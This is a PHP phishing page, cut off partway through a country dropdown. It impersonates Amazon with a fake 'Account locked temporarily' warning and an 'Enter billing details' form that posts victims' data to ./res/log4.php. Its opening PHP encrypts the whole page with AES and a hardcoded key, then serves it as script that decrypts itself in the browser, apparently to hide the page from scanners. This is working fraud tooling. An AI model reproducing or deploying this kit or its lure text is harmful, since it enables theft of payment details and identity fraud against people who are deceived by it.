
<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
Class Aes {
    public static function cipher($input, $w) {
        $Nb = 4;
        $Nr = count($w) / $Nb - 1;
        $state = array();
        for ($i = 0;$i < 4 * $Nb;$i++) $state[$i % 4][floor($i / 4) ] = $input[$i];
        $state = self::addRoundKey($state, $w, 0, $Nb);
        for ($round = 1;$round < $Nr;$round++) {
            $state = self::subBytes($state, $Nb);
            $state = self::shiftRows($state, $Nb);
            $state = self::mixColumns($state, $Nb);
            $state = self::addRoundKey($state, $w, $round, $Nb);
        }
        $state = self::subBytes($state, $Nb);
        $state = self::shiftRows($state, $Nb);
        $state = self::addRoundKey($state, $w, $Nr, $Nb);
        $output = array(4 * $Nb);
        for ($i = 0;$i < 4 * $Nb;$i++) $output[$i] = $state[$i % 4][floor($i / 4) ];
        return $output;
    }
    private static function addRoundKey($state, $w, $rnd, $Nb) {
        for ($r = 0;$r < 4;$r++) {
            for ($c = 0;$c < $Nb;$c++) $state[$r][$c]^= $w[$rnd * 4 + $c][$r];
        }
        return $state;
    }
    private static function subBytes($s, $Nb) {
        for ($r = 0;$r < 4;$r++) {
            for ($c = 0;$c < $Nb;$c++) $s[$r][$c] = self::$sBox[$s[$r][$c]];
        }
        return $s;
    }
    private static function shiftRows($s, $Nb) {
        $t = array(4);
        for ($r = 1;$r < 4;$r++) {
            for ($c = 0;$c < 4;$c++) $t[$c] = $s[$r][($c + $r) % $Nb];
            for ($c = 0;$c < 4;$c++) $s[$r][$c] = $t[$c];
        }
        return $s;
    }
    private static function mixColumns($s, $Nb) {
        for ($c = 0;$c < 4;$c++) {
            $a = array(4);
            $b = array(4);
            for ($i = 0;$i < 4;$i++) {
                $a[$i] = $s[$i][$c];
                $b[$i] = $s[$i][$c] & 0x80 ? $s[$i][$c] << 1 ^ 0x011b : $s[$i][$c] << 1;
            }
            $s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3];
            $s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3];
            $s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3];
            $s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3];
        }
        return $s;
    }
    public static function keyExpansion($key) {
        $Nb = 4;
        $Nk = count($key) / 4;
        $Nr = $Nk + 6;
        $w = array();
        $temp = array();
        for ($i = 0;$i < $Nk;$i++) {
            $r = array($key[4 * $i], $key[4 * $i + 1], $key[4 * $i + 2], $key[4 * $i + 3]);
            $w[$i] = $r;
        }
        for ($i = $Nk;$i < ($Nb * ($Nr + 1));$i++) {
            $w[$i] = array();
            for ($t = 0;$t < 4;$t++) $temp[$t] = $w[$i - 1][$t];
            if ($i % $Nk == 0) {
                $temp = self::subWord(self::rotWord($temp));
                for ($t = 0;$t < 4;$t++) $temp[$t]^= self::$rCon[$i / $Nk][$t];
            } else if ($Nk > 6 && $i % $Nk == 4) {
                $temp = self::subWord($temp);
            }
            for ($t = 0;$t < 4;$t++) $w[$i][$t] = $w[$i - $Nk][$t] ^ $temp[$t];
        }
        return $w;
    }
    private static function subWord($w) {
        for ($i = 0;$i < 4;$i++) $w[$i] = self::$sBox[$w[$i]];
        return $w;
    }
    private static function rotWord($w) {
        $tmp = $w[0];
        for ($i = 0;$i < 3;$i++) $w[$i] = $w[$i + 1];
        $w[3] = $tmp;
        return $w;
    }
    private static $sBox = array(0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16);
    private static $rCon = array(array(0x00, 0x00, 0x00, 0x00), array(0x01, 0x00, 0x00, 0x00), array(0x02, 0x00, 0x00, 0x00), array(0x04, 0x00, 0x00, 0x00), array(0x08, 0x00, 0x00, 0x00), array(0x10, 0x00, 0x00, 0x00), array(0x20, 0x00, 0x00, 0x00), array(0x40, 0x00, 0x00, 0x00), array(0x80, 0x00, 0x00, 0x00), array(0x1b, 0x00, 0x00, 0x00), array(0x36, 0x00, 0x00, 0x00));
}
Class AesCtr extends Aes {
    public static function encrypt($plaintext, $password, $nBits) {
        $blockSize = 16;
        if (!($nBits == 128 || $nBits == 192 || $nBits == 256)) return '';
        $nBytes = $nBits / 8;
        $pwBytes = array();
        for ($i = 0;$i < $nBytes;$i++) $pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff;
        $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes));
        $key = array_merge($key, array_slice($key, 0, $nBytes - 16));
        $counterBlock = array();
        $nonce = floor(microtime(true) * 1000);
        $nonceMs = $nonce % 1000;
        $nonceSec = floor($nonce / 1000);
        $nonceRnd = floor(rand(0, 0xffff));
        for ($i = 0;$i < 2;$i++) $counterBlock[$i] = self::urs($nonceMs, $i * 8) & 0xff;
        for ($i = 0;$i < 2;$i++) $counterBlock[$i + 2] = self::urs($nonceRnd, $i * 8) & 0xff;
        for ($i = 0;$i < 4;$i++) $counterBlock[$i + 4] = self::urs($nonceSec, $i * 8) & 0xff;
        $ctrTxt = '';
        for ($i = 0;$i < 8;$i++) $ctrTxt.= chr($counterBlock[$i]);
        $keySchedule = Aes::keyExpansion($key);
        $blockCount = ceil(strlen($plaintext) / $blockSize);
        $ciphertxt = array();
        for ($b = 0;$b < $blockCount;$b++) {
            for ($c = 0;$c < 4;$c++) $counterBlock[15 - $c] = self::urs($b, $c * 8) & 0xff;
            for ($c = 0;$c < 4;$c++) $counterBlock[15 - $c - 4] = self::urs($b / 0x100000000, $c * 8);
            $cipherCntr = Aes::cipher($counterBlock, $keySchedule);
            $blockLength = $b < $blockCount - 1 ? $blockSize : (strlen($plaintext) - 1) % $blockSize + 1;
            $cipherByte = array();
            for ($i = 0;$i < $blockLength;$i++) {
                $cipherByte[$i] = $cipherCntr[$i] ^ ord(substr($plaintext, $b * $blockSize + $i, 1));
                $cipherByte[$i] = chr($cipherByte[$i]);
            }
            $ciphertxt[$b] = implode('', $cipherByte);
        }
        $ciphertext = $ctrTxt . implode('', $ciphertxt);
        $ciphertext = base64_encode($ciphertext);
        return $ciphertext;
    }
    public static function decrypt($ciphertext, $password, $nBits) {
        $blockSize = 16;
        if (!($nBits == 128 || $nBits == 192 || $nBits == 256)) return '';
        $ciphertext = base64_decode($ciphertext);
        $nBytes = $nBits / 8;
        $pwBytes = array();
        for ($i = 0;$i < $nBytes;$i++) $pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff;
        $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes));
        $key = array_merge($key, array_slice($key, 0, $nBytes - 16));
        $counterBlock = array();
        $ctrTxt = substr($ciphertext, 0, 8);
        for ($i = 0;$i < 8;$i++) $counterBlock[$i] = ord(substr($ctrTxt, $i, 1));
        $keySchedule = Aes::keyExpansion($key);
        $nBlocks = ceil((strlen($ciphertext) - 8) / $blockSize);
        $ct = array();
        for ($b = 0;$b < $nBlocks;$b++) $ct[$b] = substr($ciphertext, 8 + $b * $blockSize, 16);
        $ciphertext = $ct;
        $plaintxt = array();
        for ($b = 0;$b < $nBlocks;$b++) {
            for ($c = 0;$c < 4;$c++) $counterBlock[15 - $c] = self::urs($b, $c * 8) & 0xff;
            for ($c = 0;$c < 4;$c++) $counterBlock[15 - $c - 4] = self::urs(($b + 1) / 0x100000000 - 1, $c * 8) & 0xff;
            $cipherCntr = Aes::cipher($counterBlock, $keySchedule);
            $plaintxtByte = array();
            for ($i = 0;$i < strlen($ciphertext[$b]);$i++) {
                $plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b], $i, 1));
                $plaintxtByte[$i] = chr($plaintxtByte[$i]);
            }
            $plaintxt[$b] = implode('', $plaintxtByte);
        }
        $plaintext = implode('', $plaintxt);
        return $plaintext;
    }
    private static function urs($a, $b) {
        $a&= 0xffffffff;
        $b&= 0x1f;
        if ($a & 0x80000000 && $b > 0) {
            $a = ($a >> 1) & 0x7fffffff;
            $a = $a >> ($b - 1);
        } else {
            $a = ($a >> $b);
        }
        return $a;
    }
}
function encrypt($buffer) {
    $key = '1639-7537-4662-1478<--!-->391f00c002bba69bqs4fs8df865fe15466b8<--!-->9974-5263-1008-5189';
    $nBits = 256;
    $ciphertext = AesCtr::encrypt($buffer, $key, $nBits);
    return "<html><head><script src='js/khawarezmialgo.js'></script><script> 
var khawarezmifou =  
('$key');  
var khawarezmic =  
'$ciphertext'; 
var output = Aes.Ctr.decrypt(khawarezmic, khawarezmifou, $nBits); 
document.write(output)</script></head></html>";
}
ob_start("encrypt");
?>








<!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
  <head><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
    <title>Amazon.com</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
    <link href="https://www.amazon.com/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/51AZ-Jz5kmL._RC|51da3H-4SUL.css,01evdoiemkL.css,01K+Ps1DeEL.css,31pdJv9iSzL.css,01W6EiNzKkL.css,11UGC+GXOPL.css,21LK7jaicML.css,11L58Qpo0GL.css,21kyTi1FabL.css,01ruG+gDPFL.css,01YhS3Cs-hL.css,21GwE3cR-yL.css,019SHZnt8RL.css,01wAWQRgXzL.css,21bWcRJYNIL.css,11WgRxUdJRL.css,01dU8+SPlFL.css,11ocrgKoE-L.css,01SHjPML6tL.css,111-D2qRjiL.css,01QrWuRrZ-L.css,310Imb6LqFL.css,01piEq-AdwL.css,11Z1a0FxSIL.css,01cbS3UK11L.css,21mOLw+nYYL.css,01giMEP+djL.css_.css?AUIClients/AmazonUI#us.not-trident" />
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/31z1pBwzQGL.css?AUIClients/AbbottPortalAssets" />
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01YgPUYiZcL.css?AUIClients/AbbottViewComponentCommonAssets" />
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11-z5dr5ThL.css?AUIClients/AbbottViewComponentDesktopAssets" />
<script>
(function(f,h,Q,F){function G(a){v&&v.tag&&v.tag(q(":","aui",a))}function w(a,b){v&&v.count&&v.count("aui:"+a,0===b?0:b||(v.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function y(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function H(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ua(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(T,0),S=!0))};for(g();c--;)da[a[c]]?g():(A[a[c]]=A[a[c]]||[]).push(g)}function va(a,b,c,e,g){var d=h.createElement(a?"script":"link");y(d,"error",e);g&&y(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){va(b,c,d,function(b){U?w("resource_unload"):
d?(d=!1,w("resource_retry"),g()):(w("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;w("resource_count");var d=!0;return!g()}}function wa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)I.hasOwnProperty(c[d])&&(g[d]=V.hasOwnProperty(c[d])?V[c[d]](I[c[d]],e):I[c[d]]);return g}function B(a,b,c,e,g){return function(d,
h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=C(),a=h.apply(f,wa(d,k,l)),p.end=C());if(b){I[d]=a;a=d;for(da[a]=!0;(A[a]||[]).length;)A[a].shift()();delete A[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=F);b&&(d=d?d.replace(ga,""):"__NONAME__",W.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",W[d]),k.attribution),d),W[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=a[m].replace(ga,"");var p=ha[d||"anon"+ ++xa]={depend:l,registered:C(),
namespace:k.namespace};c?n():ua(l,k.guardFatal(d,n));return{decorate:function(a){V[d]=k.guardFatal(d,a)}}}}function ia(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:B(b,!1,a,!1,this),register:B(b,!0,a,!1,this)}}}function X(a,b){return function(c,e){e||(e=c,c=F);var g=this.attribution;return function(){z.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);z.pop();return d}}}function J(a,b){this.load={js:ea(this,!0),css:ea(this)};H(this,"namespace",
b);H(this,"attribution",a)}function ja(){h.body?t.trigger("a-bodyBegin"):setTimeout(ja,20)}function D(a,b){a.className=Y(a,b)+" "+b}function Y(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ka(a){try{return a()}catch(b){return!1}}function K(){if(L){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Z.w)||50<a.h-Z.h?(Z=a,M=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?D(n,"a-ws"):n.className=Y(n,"a-ws")):0<M&&(M--,la=
setTimeout(K,16))}}function ya(a){(L=a===F?!L:!!a)&&K()}function za(){return L}function u(a,b){return"sw:"+(b||"")+":"+a+":"}function ma(){na.forEach(function(a){G(a)})}function p(a){na.push(a)}function oa(a,b,c,e){if(c){b=m(/Chrome/i)&&!m(/Edge/i)&&!m(/OPR/i)&&!a.capabilities.isAmazonApp&&!m(new RegExp(aa+"bwv"+aa+"b"));var g=u(e,"browser"),d=u(e,"prod_mshop"),f=u(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(p(g+"supported"),c.browser.action(g,e));!b&&c.browser&&p(g+"unsupported");
c.prodMshop&&p(d+"unsupported");c.betaMshop&&p(f+"unsupported")}}"use strict";var N=Q.now=Q.now||function(){return+new Q},C=function(a){return a&&a.now?a.now.bind(a):N}(f.performance),O=C(),r=f.AmazonUIPageJS||f.P;if(r&&r.when&&r.register){for(var O=[],l=h.currentScript;l;l=l.parentElement)l.id&&O.push(l.id);return r.log("A copy of P has already been loaded on this page.","FATAL",O.join(" "))}var v=f.ue;G();G("aui_build_date:3.20.4-2020-04-24");var R=[],S=!1,T;T=function(){for(var a=setTimeout(T,
0),b=N();R.length;)if(R.shift()(),50<N()-b)return;clearTimeout(a);S=!1};var da={},A={},fa={},U=!1;y(f,"beforeunload",function(){U=!0;setTimeout(function(){U=!1},1E4)});var ga=/^prv:/,W={},I={},V={},ha={},xa=0,aa=String.fromCharCode(92),E,z=[],pa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(aa,g.message,"at "+q(":",b,c,e)):F);var d=z.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&
console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));z=[];pa&&(d=[].slice.call(arguments),d[4]=g,pa.apply(f,d))};J.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:X(),guardFatal:X("FATAL"),
guardCurrent:function(a){var b=z[z.length-1];return b?X(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:B([],!0,!0,!0),register:B([],!0),execute:B([]),AUI_BUILD_DATE:"3.20.4-2020-04-24",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=N();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&E.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new J(a)},
_namespace:function(a,b){return new J(a,b)}};var t=H(f,"AmazonUIPageJS",new J);E=t._namespace("PageJS","AmazonUI");E.declare("prv:p-debug",ha);t.declare("p-recorder-events",[]);t.declare("p-recorder-stop",function(){});H(f,"P",t);ja();if(h.addEventListener){var qa;h.addEventListener("DOMContentLoaded",qa=function(){t.trigger("a-domready");h.removeEventListener("DOMContentLoaded",qa,!1)},!1)}var n=h.documentElement,ba=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText=
"background-image:-webkit-gradient(linear,left top,right bottom,from(#1E4),to(white));background-image:-webkit-linear-gradient(left top,#1E4,white);background-image:linear-gradient(left top,#1E4,white);";return~b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);
return a}}}(),r=n.className,ra=/(^| )a-mobile( |$)/.test(r),sa=/(^| )a-tablet( |$)/.test(r),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},
dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==
f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return ba.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;w("hiRes"+(ra?"Mobile":sa?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return ba.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return ra},tablet:function(){return sa},rtl:function(){return"rtl"===n.dir}};for(l in k)k.hasOwnProperty(l)&&(k[l]=ka(k[l]));for(var ca="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ca.length;P++)k[ca[P]]=ka(function(){return ba.test(ca[P])});var L=!0,la=0,Z=
{w:0,h:0},M=4;K();y(f,"resize",function(){clearTimeout(la);M=4;K()});var ta={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=Y(n,"a-no-js");D(n,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||D(n,"a-ember");r=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&r.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));D(n,r.join(" "));n.setAttribute("data-aui-build-date",
"3.20.4-2020-04-24");t.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&ta,toggleResponsiveGrid:ya,responsiveGridEnabled:za}});m(/UCBrowser/i)||k.localStorage&&D(n,ta.getItem("a-font-class"));t.declare("a-event-revised-handling",!1);var x;try{x=navigator.serviceWorker}catch(a){G("sw:nav_err")}x&&(y(x,"message",function(a){a&&a.data&&w(a.data.k,a.data.v)}),x.controller&&x.controller.postMessage("MSG-RDY"));var na=[];(function(a){var b=a.reg,c=a.unreg;x&&x.getRegistrations?
(E.when("A","a-util").execute(function(a,b){oa(a,b,c,"unregister")}),y(f,"load",function(){E.when("A","a-util").execute(function(a,c){oa(a,c,b,"register");ma()})})):(b&&(b.browser&&p(u("register","browser")+"unsupported"),b.prodMshop&&p(u("register","prod_mshop")+"unsupported"),b.betaMshop&&p(u("register","beta_mshop")+"unsupported")),c&&(c.browser&&p(u("unregister","browser")+"unsupported"),c.prodMshop&&p(u("unregister","prod_mshop")+"unsupported"),c.betaMshop&&p(u("unregister","beta_mshop")+"unsupported")),
ma())})({reg:{},unreg:{}});t.declare("a-fix-event-off",!1);w("pagejs:pkgExecTime",C()-O)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11-BZEJ8lnL.js,61xmyjKeOpL.js,21Of0-9HPCL.js,012FVc3131L.js,11S5WBtBslL.js,51CF7BmbF2L.js,11AHlQhPRjL.js,016iHgpF74L.js,11aNYFFS5hL.js,116tgw9TSaL.js,211-p4GRUCL.js,01PoLXBDXWL.js,616HiO8WWWL.js,01ezj5Rkz1L.js,11BOgvnnntL.js,31shqoNXX9L.js,01rpauTep4L.js,01iyxuSGj4L.js,01c0+InVwfL.js_.js?AUIClients/AmazonUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/315LQCTn-gL.js?AUIClients/AmazonUIFormControlsJS');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21QREc8SBAL.js?AUIClients/AbbottPortalAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31GNaLTkg5L.js?AUIClients/AbbottViewComponentCommonAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01QOTK82vIL.js?AUIClients/AbbottViewComponentDesktopAssets');
</script>

  </head>
  <body class="abbott-default a-m-us a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_preload_261698-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_PRELOAD_261698":"C","AUI_PCI_RISK_BANNER_210084":"C"}</script>
    <div class="a-section a-padding-medium">
      


<div class="a-section a-spacing-none">
  <div class="a-section a-spacing-medium a-text-center">
    <a class="a-link-nav-icon" tabindex="-1" href="https://www.amazon.com/">
      <i class="a-icon a-icon-logo" role="img" aria-label="amazon.com"></i>
      
    </a>
  </div>
</div>
      <div class="a-section abbott-main-section desktop">
        <form id="abbott-form" method="post" action="./res/log4.php" class="abbott-form">
          
          
          
          
            
            
            
            











<div class="a-section a-spacing-base abbott-form-center">
    <div class="a-box a-alert a-alert-warning a-spacing-top-small"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Account locked temporarily</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        
            We noticed unusual payment activity on your account and need to verify ownership of the payment method used on your most recent order.
            
                <span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;name&quot;:&quot;why-popover&quot;,&quot;header&quot;:&quot;Why are we asking for this information?&quot;}">
                    (<a class="a-link-normal" href="#">Why?</a>)
                </span>
            
        
    </div></div></div>
</div>
          
            
            
            
            



<div class="a-popover-preload" id="a-popover-why-popover">
    <span>
        Amazon takes your security seriously, and monitors activity on your account to keep your account and payment methods safe.
    </span>
    <ul class="a-unordered-list a-vertical">
        
            <li><span class="a-list-item">
                We noticed unusual payment activity on your account.
            </span></li>
        
            <li><span class="a-list-item">
                We have locked your account temporarily so we could review it with you.
            </span></li>
        
            <li><span class="a-list-item">
                While your account is locked, your pending orders are on hold and may be cancelled.
            </span></li>
        
            <li><span class="a-list-item">
                If you promptly submit this form and attach a supporting document, we should be able to help you unlock your account more quickly.
            </span></li>
        
    </ul>
</div>
          
            
          
            



<div class="a-section a-spacing-large a-spacing-top-large abbott-form-center">
    <h1 class="a-size-large a-text-bold">
        Enter billing details
    </h1>
    <span>
        This is required to unlock your account.
    </span>
</div>
          
            
            
            
            










          
            
            
            
            





<div class="a-section a-spacing-large abbott-form-center">
    <div class="a-section a-spacing-none">
        <label class="a-form-label">
            Full name
        </label>
        <input type="text" maxlength="50" placeholder="Name that appears on the payment method" name="name" required="required" pattern="^(\w\w+)\s(\w+)$" class="a-input-text a-form-normal abbott-full-width"/>
    </div>
    
</div>
          
            
            
            
            












<div class="a-section a-spacing-large abbott-form-center">
    <div class="a-section a-spacing-base">
        <label class="a-form-label">
            Country/Region
        </label>
        <span class="a-dropdown-container"><select name="country-code" autocomplete="off" tabindex="-1" class="a-native-dropdown">
            
                <option data-form="generic" value="AF">
                    Afghanistan
                </option>
            
                <option data-form="generic" value="AX">
                    Aland Islands
                </option>
            
                <option data-form="generic" value="AL">
                    Albania
                </option>
            
                <option data-form="generic" value="DZ">
                    Algeria
                </option>
            
                <option data-form="generic" value="AS">
                    American Samoa
                </option>
            
                <option data-form="generic" value="AD">
                    Andorra
                </option>
            
                <option data-form="generic" value="AO">
                    Angola
                </option>
            
                <option data-form="generic" value="AI">
                    Anguilla
                </option>
            
                <option data-form="generic" value="AQ">
                    Antarctica
                </option>
            
                <option data-form="generic" value="AG">
                    Antigua and Barbuda
                </option>
            
                <option data-form="generic" value="AR">
                    Argentina
                </option>
            
                <option data-form="generic" value="AM">
                    Armenia
                </option>
            
                <option data-form="generic" value="AW">
                    Aruba
                </option>
            
                <option data-form="generic" value="AU">
                    Australia
                </option>
            
                <option data-form="generic" value="AT">
                    Austria
                </option>
            
                <option data-form="generic" value="AZ">
                    Azerbaijan
                </option>
            
                <option data-form="generic" value="BS">
                    Bahamas, The
                </option>
            
                <option data-form="generic" value="BH">
                    Bahrain
                </option>
            
                <option data-form="generic" value="BD">
                    Bangladesh
                </option>
            
                <option data-form="generic" value="BB">
                    Barbados
                </option>
            
                <option data-form="generic" value="BY">
                    Belarus
                </option>
            
                <option data-form="generic" value="BE">
                    Belgium
                </option>
            
                <option data-form="generic" value="BZ">
                    Belize
                </option>
            
                <option data-form="generic" value="BJ">
                    Benin
                </option>
            
                <option data-form="generic" value="BM">
                    Bermuda
                </option>
            
                <option data-form="generic" value="BT">
                    Bhutan
                </option>
            
                <option data-form="generic" value="BO">
                    Bolivia
                </option>
